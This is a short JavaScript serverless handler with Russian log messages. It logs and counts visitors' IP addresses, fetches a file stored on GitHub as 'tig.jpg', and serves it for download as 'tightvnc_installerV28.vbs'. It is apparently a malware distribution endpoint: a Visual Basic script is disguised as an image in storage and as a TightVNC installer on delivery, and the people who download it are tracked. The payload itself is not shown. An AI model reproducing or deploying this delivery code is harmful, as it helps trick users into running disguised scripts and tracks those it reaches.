import { kv } from '@vercel/kv';

export default async function handler(req, res) {
  const ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown')
    .toString()
    .split(',')[0]
    .trim();

   await kv.sadd('unique_tig', ip);

  const uniqueCount = await kv.scard('unique_tig');

  console.log(`[${new Date().toISOString()}] Скачивание | IP: ${ip} | Уникальных tig: ${uniqueCount}`);

  const rawUrl = 'https://raw.githubusercontent.com/mslwcnzy/jpg/refs/heads/main/tig.jpg';

  try {
    const response = await fetch(rawUrl);
    const buffer = Buffer.from(await response.arrayBuffer());

    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="tightvnc_installerV28.vbs"');
    res.send(buffer);
  } catch (error) {
    console.error('Ошибка:', error);
    res.status(500).send('Ошибка');
  }
}
